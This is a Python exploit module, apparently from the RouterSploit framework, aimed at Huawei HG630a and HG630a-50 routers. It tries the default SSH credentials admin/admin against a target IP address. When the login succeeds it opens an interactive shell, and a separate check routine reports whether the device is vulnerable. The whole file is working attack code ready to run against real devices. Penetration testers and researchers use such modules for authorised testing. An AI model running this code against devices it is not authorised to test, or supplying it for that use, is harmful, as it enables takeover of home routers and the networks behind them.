import socket
import paramiko

from routersploit import (
    exploits,
    print_error,
    print_success,
    mute,
    ssh_interactive,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Huawei HG630a and HG630a-50 devices. If the target is vulnerable it is possible to authenticate through SSH service.
    """
    __info__ = {
        'name': 'Huawei HG630a Default Credentials',
        'description': 'Module exploits default SSH credentials Huawei HG630a and HG630a-50 devices. '
                       'If the target is vulnerable it is possible to authenticate through SSH service.',
        'authors': [
            'Murat Sahin (@murtshn)',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/38663/',
        ],
        'devices': [
            'Huawei HG630a',
            'Huawei HG630a-50',
        ],
    }

    target = exploits.Option('', 'Target IP address', validators=validators.address)  # target address
    ssh_port = exploits.Option(22, 'Target SSH Port', validators=validators.integer)  # target port

    user = exploits.Option('admin', 'Default username to log in with')
    password = exploits.Option('admin', 'Default password to log in with')

    def run(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.target, self.ssh_port, timeout=5, username=self.user, password=self.password)
        except (paramiko.ssh_exception.SSHException, socket.error):
            print_error("Exploit failed - cannot log in with credentials {} / {}".format(self.user, self.password))
            return
        else:
            print_success("SSH - Successful authentication")
            ssh_interactive(ssh)

    @mute
    def check(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.target, self.ssh_port, timeout=5, username=self.user, password=self.password)
        except (paramiko.ssh_exception.SSHException, socket.error):
            return False  # target is not vulnerable
        else:
            return True  # target is vulnerable
